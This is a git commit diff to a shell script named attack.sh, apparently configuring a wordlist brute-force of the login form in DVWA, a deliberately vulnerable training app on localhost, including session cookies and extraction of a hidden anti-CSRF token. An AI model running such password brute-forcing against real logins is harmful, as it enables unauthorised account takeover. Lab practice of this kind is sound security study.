fc191d0ce4b176927cf5e9561500bfc670e63ea9
kyphan38 <kyphan.work@gmail.com>
2024-07-22 20:03:03 +0700

    update

--- attack/attack.sh
+++ attack/attack.sh
@@ -6,6 +6,5 @@ header="Cookie: PHPSESSID=espk3ffpbugm353q6f2bg2e82e; security=low" \
 1="passwords.txt" \
 0="usernames.txt" \
 -x ignore:fgrep="Username and/or password incorrect." \
-before_urls="http://localhost/vulnerabilities/brute/" \
 before_egrep="EXTRACTED_TOKEN:<input type='hidden' name='user_token' value='(\w+)' />" \
 before_header="Cookie: PHPSESSID=espk3ffpbugm353q6f2bg2e82e; security=high"
